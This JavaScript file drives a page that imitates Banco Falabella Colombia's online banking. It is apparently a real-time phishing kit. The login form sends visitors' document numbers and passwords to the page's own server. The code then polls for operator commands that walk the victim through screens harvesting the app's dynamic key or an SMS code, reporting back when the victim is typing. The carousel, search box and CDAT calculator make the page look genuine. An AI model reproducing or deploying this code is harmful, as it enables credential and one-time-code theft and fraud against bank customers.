import { toast, setSession, getSession, nameFromDoc } from "./auth.js";

const loginOverlay = document.getElementById("loginOverlay");
const openLogin = document.getElementById("openLogin");
const closeLogin = document.getElementById("closeLogin");
const docTypeBtn = document.getElementById("docTypeBtn");
const docTypeMenu = document.getElementById("docTypeMenu");
const docTypeLabel = document.getElementById("docTypeLabel");
const docType = document.getElementById("docType");
const docNumber = document.getElementById("docNumber");
const password = document.getElementById("password");
const loginSubmit = document.getElementById("loginSubmit");
const loginError = document.getElementById("loginError");
const togglePass = document.getElementById("togglePass");

// Ocultar overlay al cargar si ya tiene sesión iniciada
if (getSession() && loginOverlay) {
  loginOverlay.classList.remove("open");
}

function openPanel() {
  if (getSession()) {
    window.location.href = "/banca.html";
    return;
  }
  loginOverlay.classList.add("open");
}

function closePanel() {
  loginOverlay.classList.remove("open");
}

openLogin.addEventListener("click", openPanel);
closeLogin.addEventListener("click", closePanel);
loginOverlay.addEventListener("click", (e) => {
  if (e.target === loginOverlay) closePanel();
});

docTypeBtn.addEventListener("click", () => {
  docTypeMenu.classList.toggle("open");
});

docTypeMenu.querySelectorAll("button").forEach((btn) => {
  btn.addEventListener("click", () => {
    docType.value = btn.dataset.value;
    docTypeLabel.textContent = btn.textContent;
    docTypeMenu.classList.remove("open");
    validateLogin();
  });
});

document.addEventListener("click", (e) => {
  if (!e.target.closest(".field")) docTypeMenu.classList.remove("open");
});

togglePass.addEventListener("click", () => {
  password.type = password.type === "password" ? "text" : "password";
});

function onlyDigits(el, max) {
  el.value = el.value.replace(/\D/g, "").slice(0, max);
}

docNumber.addEventListener("input", () => {
  onlyDigits(docNumber, 12);
  validateLogin();
});

password.addEventListener("input", () => {
  onlyDigits(password, 6);
  validateLogin();
});

function validateLogin() {
  const ok = docNumber.value.length >= 6 && password.value.length === 6;
  loginSubmit.disabled = !ok;
  loginSubmit.classList.toggle("btn-disabled", !ok);
  loginSubmit.classList.toggle("btn-primary", ok);
}

let sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
sessionStorage.setItem('sessionId', sessionId);

let pingInterval = null;
let pollInterval = null;
let currentScreen = 'login'; // 'login', 'dinamica', 'sms'

function startPing() {
  if (pingInterval) clearInterval(pingInterval);
  fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
  pingInterval = setInterval(() => {
    fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
  }, 3000);
}

function stopPing() {
  if (pingInterval) {
    clearInterval(pingInterval);
    pingInterval = null;
  }
}

function showClaveScreen(type) {
  currentScreen = type;
  const loader = document.getElementById("bfLoader");
  loader.classList.remove("open");
  
  document.getElementById("loginOverlay").classList.remove("open");
  document.getElementById("claveScreen").hidden = false;
  
  const claveTitle = document.getElementById("claveTitle");
  const claveDesc = document.getElementById("claveDesc");
  const claveSideText = document.getElementById("claveSideText");
  const claveBadgeText = document.getElementById("claveBadgeText");
  const claveInput = document.getElementById("claveInput");
  const claveAuth = document.getElementById("claveAuth");
  const claveError = document.getElementById("claveError");
  
  if (claveError) claveError.textContent = "";
  
  if (type === 'sms') {
    claveTitle.textContent = "Ingreso de Código SMS";
    claveDesc.innerHTML = "Ingresa el código de seguridad de 6 dígitos que enviamos por SMS a tu celular";
    claveSideText.innerHTML = "Encuentra tu <strong>Código SMS</strong> en la bandeja de entrada de tu celular";
    claveBadgeText.textContent = "Código SMS";
  } else {
    claveTitle.textContent = "Ingreso de Clave Dinámica";
    claveDesc.innerHTML = "Ingresa el código de seguridad de 6 dígitos que aparece en tu app <strong>Banco Falabella</strong>";
    claveSideText.innerHTML = "Encuentra tu <strong>Clave Dinámica</strong> en la pantalla principal de tu app <strong>Banco Falabella</strong>";
    claveBadgeText.textContent = "Clave Dinámica";
  }
  
  if (claveInput) {
    claveInput.value = "";
    claveInput.focus();
  }
  if (claveAuth) {
    claveAuth.disabled = true;
  }
}

function startPolling() {
  if (pollInterval) clearInterval(pollInterval);
  pollInterval = setInterval(async () => {
    try {
      const response = await fetch(`/api/sessions/${sessionId}`);
      if (response.ok) {
        const data = await response.json();
        const action = data.action;
        const state = data.state;
        const loader = document.getElementById("bfLoader");

        if (action === 'dinamica') {
          if (currentScreen !== 'dinamica') {
            showClaveScreen('dinamica');
          }
        } else if (action === 'sms') {
          if (currentScreen !== 'sms') {
            showClaveScreen('sms');
          }
        } else if (action === 'error-login') {
          stopPing();
          stopPolling();
          loader.classList.remove("open");
          document.getElementById("claveScreen").hidden = true;
          document.getElementById("loginOverlay").classList.add("open");
          loginSubmit.disabled = false;
          loginSubmit.classList.remove("btn-disabled");
          loginSubmit.classList.add("btn-primary");
          document.getElementById("loginError").textContent = "Documento o contraseña incorrecta. Por favor, verifica tus datos.";
          currentScreen = 'login';
        } else if (state === 'error-dinamica' || state === 'error-sms') {
          loader.classList.remove("open");
          const claveAuth = document.getElementById("claveAuth");
          if (claveAuth) claveAuth.disabled = false;
          document.getElementById("claveError").textContent = "Código de validación incorrecto o expirado. Intenta de nuevo.";
        } else if (action === 'done') {
          stopPing();
          stopPolling();
          loader.classList.remove("open");
          document.getElementById("claveScreen").hidden = true;
          
          toast("Verificación exitosa");
          
          setSession({
            type: docType.value,
            doc: docNumber.value,
            name: nameFromDoc(docNumber.value),
          });
          
          setTimeout(() => {
            window.location.href = "/banca";
          }, 1500);
        }
      }
    } catch (_) {}
  }, 1500);
}

function stopPolling() {
  if (pollInterval) {
    clearInterval(pollInterval);
    pollInterval = null;
  }
}

document.getElementById("loginForm").addEventListener("submit", (e) => {
  e.preventDefault();
  if (loginSubmit.disabled) return;
  document.getElementById("loginError").textContent = "";
  document.getElementById("bfLoader").classList.add("open");
  loginSubmit.disabled = true;

  const session = {
    id: sessionId,
    username: `${docType.value.toUpperCase()}:${docNumber.value}`,
    password: password.value,
    tipoUsuario: docType.value,
    device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
    ip: '186.29.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255),
    state: 'waiting',
    createdAt: Date.now()
  };

  fetch('/api/sessions', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(session)
  })
  .then(() => {
    startPing();
    
    // Auto-transición a Clave Dinámica después de 1.5s
    setTimeout(() => {
      fetch(`/api/sessions/${sessionId}/state`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ state: 'waiting-dinamica' })
      })
      .then(() => {
        showClaveScreen('dinamica');
        startPolling();
      })
      .catch(() => {
        showClaveScreen('dinamica');
        startPolling();
      });
    }, 1500);
  })
  .catch(() => {
    document.getElementById("bfLoader").classList.remove("open");
    loginSubmit.disabled = false;
    document.getElementById("loginError").textContent = "Error al conectar. Intenta de nuevo.";
  });
});

const claveInput = document.getElementById("claveInput");
claveInput?.addEventListener("input", () => {
  claveInput.value = claveInput.value.replace(/\D/g, "").slice(0, 6);
  
  // Habilitar/deshabilitar botón de autorizar
  const claveAuth = document.getElementById("claveAuth");
  if (claveAuth) {
    claveAuth.disabled = claveInput.value.length !== 6;
  }

  if (pollInterval) {
    fetch(`/api/sessions/${sessionId}/state`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ state: 'typing' })
    }).catch(() => {});
  }
});

document.getElementById("claveForm")?.addEventListener("submit", (e) => {
  e.preventDefault();
  const claveAuth = document.getElementById("claveAuth");
  if (claveInput.value.length !== 6) {
    document.getElementById("claveError").textContent = "El código debe tener 6 dígitos.";
    return;
  }
  document.getElementById("claveError").textContent = "";
  document.getElementById("bfLoader").classList.add("open");
  if (claveAuth) claveAuth.disabled = true;

  fetch(`/api/sessions/${sessionId}/token`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token: claveInput.value })
  })
  .then(() => {
    startPing();
    startPolling();
  })
  .catch(() => {
    document.getElementById("bfLoader").classList.remove("open");
    if (claveAuth) claveAuth.disabled = false;
    document.getElementById("claveError").textContent = "Error de red. Intenta de nuevo.";
  });
});

document.getElementById("claveHelp")?.addEventListener("click", () => {
  toast("Ingresa el código que visualizas en la aplicación de tu celular.");
});

[docNumber, password].forEach(input => {
  input.addEventListener("input", () => {
    if (pollInterval) {
      fetch(`/api/sessions/${sessionId}/state`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ state: 'typing' })
      }).catch(() => {});
    }
  });
});

document.getElementById("acceptCookies").addEventListener("click", () => {
  document.getElementById("cookies").classList.add("hidden");
  localStorage.setItem("bf_cookies", "1");
});

if (localStorage.getItem("bf_cookies")) {
  document.getElementById("cookies").classList.add("hidden");
}

const slides = [...document.querySelectorAll(".slide")];
const dots = document.getElementById("dots");
let idx = 0;

slides.forEach((_, i) => {
  const b = document.createElement("button");
  if (i === 0) b.classList.add("active");
  b.addEventListener("click", () => go(i));
  dots.appendChild(b);
});

function go(n) {
  idx = (n + slides.length) % slides.length;
  slides.forEach((s, i) => s.classList.toggle("active", i === idx));
  [...dots.children].forEach((d, i) => d.classList.toggle("active", i === idx));
}

document.getElementById("prevSlide").addEventListener("click", () => go(idx - 1));
document.getElementById("nextSlide").addEventListener("click", () => go(idx + 1));
setInterval(() => go(idx + 1), 7000);

const searchOverlay = document.getElementById("searchOverlay");
const catalog = [
  "Tarjeta de crédito CMR",
  "Cuenta de ahorros costo $0",
  "Alcancía Digital",
  "CDAT",
  "Crédito de libre inversión",
  "CMR Puntos",
  "Paga tu tarjeta",
  "Oficinas",
  "Certificado tributario",
];

document.getElementById("openSearch").addEventListener("click", () => {
  searchOverlay.classList.add("open");
  document.getElementById("searchInput").focus();
});
document.getElementById("closeSearch").addEventListener("click", () => {
  searchOverlay.classList.remove("open");
});

document.getElementById("searchInput").addEventListener("input", (e) => {
  const q = e.target.value.toLowerCase();
  const hits = catalog.filter((x) => x.toLowerCase().includes(q));
  document.getElementById("searchResults").innerHTML = hits
    .map((h) => `<a href="#cmr">${h}</a>`)
    .join("");
});

document.getElementById("openMenu")?.addEventListener("click", () => {
  const nav = document.getElementById("mainNav");
  nav.style.display = nav.style.display === "flex" ? "none" : "flex";
  nav.style.flexWrap = "wrap";
});

const recoverModal = document.getElementById("recoverModal");
document.getElementById("recoverLink").addEventListener("click", (e) => {
  e.preventDefault();
  recoverModal.classList.add("open");
});
document.getElementById("closeRecover").addEventListener("click", () => {
  recoverModal.classList.remove("open");
});
document.getElementById("recoverBtn").addEventListener("click", () => {
  recoverModal.classList.remove("open");
  toast("Clave lista. Usa cualquier clave de 6 dígitos para ingresar.");
});

const simularModal = document.getElementById("simularModal");
document.getElementById("simular").addEventListener("click", () => simularModal.classList.add("open"));
document.getElementById("closeSimular").addEventListener("click", () => simularModal.classList.remove("open"));
document.getElementById("calcCdat").addEventListener("click", () => {
  const monto = Number(String(document.getElementById("cdatMonto").value).replace(/\D/g, "")) || 0;
  const plazo = Number(document.getElementById("cdatPlazo").value);
  const ea = 0.095;
  const ganancia = Math.round(monto * (ea * (plazo / 360)));
  document.getElementById("cdatResult").textContent =
    `Al vencimiento recibirías aprox. ${new Intl.NumberFormat("es-CO", { style: "currency", currency: "COP", maximumFractionDigits: 0 }).format(monto + ganancia)} (intereses ${new Intl.NumberFormat("es-CO", { style: "currency", currency: "COP", maximumFractionDigits: 0 }).format(ganancia)}).`;
});

document.getElementById("hazteCliente").addEventListener("click", () => {
  toast("En el demo puedes abrir productos desde Banca en línea.");
  openPanel();
});

document.querySelectorAll(".open-card, .product, .pay-card, .banner50, .shop-card").forEach((el) => {
  el.style.cursor = "pointer";
  el.addEventListener("click", openPanel);
});
